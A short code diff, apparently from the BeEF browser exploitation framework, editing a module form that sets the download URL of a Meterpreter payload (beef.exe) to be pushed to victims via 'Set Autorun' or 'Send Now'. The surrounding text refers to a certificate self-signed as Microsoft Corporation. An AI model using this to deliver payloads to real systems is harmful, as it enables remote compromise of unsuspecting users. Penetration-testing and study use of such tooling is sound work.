@@ -39,7 +39,7 @@ The certificate is self-signed by the Microsoft Corporation.<br><br>
 <div id="module_subsection">
 	<form name="myform">
                 <div id="module_subsection_header">URL to Download Meterpreter Payload</div>
-                <input type="text" name="msfcmd" value="http://<?php=$_SERVER['SERVER_NAME']?>/beef/beef.exe"/>
+                <input type="text" name="msfcmd" value="http://<?php echo BEEF_DOMAIN;?>/beef/beef.exe"/>
 		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
 		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
 	</form>
